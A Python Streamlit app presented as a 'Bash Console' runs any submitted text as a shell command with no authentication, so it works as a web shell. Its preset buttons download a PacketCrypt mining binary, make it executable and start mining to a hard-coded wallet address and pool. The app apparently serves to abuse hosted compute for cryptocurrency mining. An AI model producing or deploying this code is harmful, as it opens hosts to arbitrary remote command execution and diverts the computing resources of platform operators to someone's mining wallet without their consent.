import streamlit as st
import subprocess
import time

# Set page configuration
st.set_page_config(
    page_title="Bash Console",
    page_icon="💻",
    layout="centered"
)

# Initialize session state
if 'console_log' not in st.session_state:
    st.session_state.console_log = "Welcome to Bash Console\n\n"

# Simple title
st.title("💻 Bash Console")

# Command input
st.markdown("### Enter Command:")
command = st.text_input("", placeholder="Enter bash command here...", key="cmd_input")

# Execute button
if st.button("🚀 Execute Command", type="primary", use_container_width=True):
    if command.strip():
        # Add command to log with timestamp
        timestamp = time.strftime("%H:%M:%S")
        st.session_state.console_log += f"[{timestamp}] $ {command}\n"
        
        try:
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,  # 60 second timeout
                cwd="."  # Current directory
            )
            
            # Add output to log
            if result.stdout:
                st.session_state.console_log += result.stdout
            
            if result.stderr:
                st.session_state.console_log += result.stderr
                
            if result.returncode != 0:
                st.session_state.console_log += f"\n[Process exited with code {result.returncode}]\n"
                
        except subprocess.TimeoutExpired:
            st.session_state.console_log += "\n[ERROR: Command timed out after 60 seconds]\n"
        except Exception as e:
            st.session_state.console_log += f"\n[ERROR: {str(e)}]\n"
        
        st.session_state.console_log += "\n" + "="*50 + "\n\n"
        st.rerun()

# Control buttons
col1, col2 = st.columns(2)
with col1:
    if st.button("🧹 Clear Log", use_container_width=True):
        st.session_state.console_log = "Welcome to Bash Console\n\n"
        st.rerun()

with col2:
    if st.button("📁 Show Current Directory", use_container_width=True):
        st.session_state.cmd_input = "pwd && ls -la"
        st.rerun()

# Console output
st.markdown("### Console Output:")
st.text_area(
    "",
    value=st.session_state.console_log,
    height=400,
    disabled=True,
    key="output_area"
)

# Quick commands section
st.markdown("### 🚀 Quick Commands:")

quick_cmds = [
    ("📂 List Files", "ls -la"),
    ("📍 Current Directory", "pwd"),
    ("⬇️ Download PacketCrypt", "curl -L https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.6.0/packetcrypt-v0.6.0-linux_amd64 -o ppp"),
    ("🔧 Make Executable", "chmod +x ppp"),
    ("⛏️ Start Mining", "./ppp ann -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx http://pool.pkt.world"),
    ("❌ Kill Mining", "pkill ppp")
]

# Create buttons in pairs
for i in range(0, len(quick_cmds), 2):
    col1, col2 = st.columns(2)
    
    with col1:
        if i < len(quick_cmds):
            name, cmd = quick_cmds[i]
            if st.button(name, key=f"quick_{i}", use_container_width=True):
                st.session_state.cmd_input = cmd
                st.rerun()
    
    with col2:
        if i + 1 < len(quick_cmds):
            name, cmd = quick_cmds[i + 1]
            if st.button(name, key=f"quick_{i+1}", use_container_width=True):
                st.session_state.cmd_input = cmd
                st.rerun()

# Info section
st.markdown("---")
st.info("💡 **Tips:** Type any bash command and click Execute. Use Quick Commands for common operations.")
st.caption("⚠️ Long-running commands will timeout after 60 seconds. Mining commands may need to be run in background.")
